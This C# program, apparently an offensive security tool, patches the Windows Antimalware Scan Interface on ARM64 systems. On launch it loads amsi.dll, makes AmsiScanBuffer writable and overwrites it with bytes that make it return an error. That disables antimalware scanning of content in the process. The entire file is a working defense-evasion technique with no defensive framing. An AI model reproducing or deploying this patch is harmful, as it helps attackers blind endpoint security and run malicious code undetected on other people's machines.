using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ARM64_AmsiPatch
{
    internal static class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static void BypassAMSI()
        {
            IntPtr Library = LoadLibrary("amsi.dll");
            IntPtr Address = GetProcAddress(Library, "AmsiScanBuffer");
            uint p;
            Byte[] Patch = {
                0x40, 0x00, 0x80, 0xD2, // movz x0, #0x57
                0x00, 0x1C, 0x88, 0xF2, // movk x0, #0x8007, lsl #16
                0xC0, 0x03, 0x5F, 0xD6  // ret
            };
            VirtualProtect(Address, (UIntPtr)Patch.Length, 0x40, out p);
            Marshal.Copy(Patch, 0, Address, Patch.Length);
            VirtualProtect(Address, (UIntPtr)Patch.Length, p, out p);
            Console.WriteLine("ARM64 Patch Applied");
        }

        [STAThread]
        static void Main()
        {
            BypassAMSI();
            Console.ReadLine();
            Environment.Exit(-1);
        }
    }
}
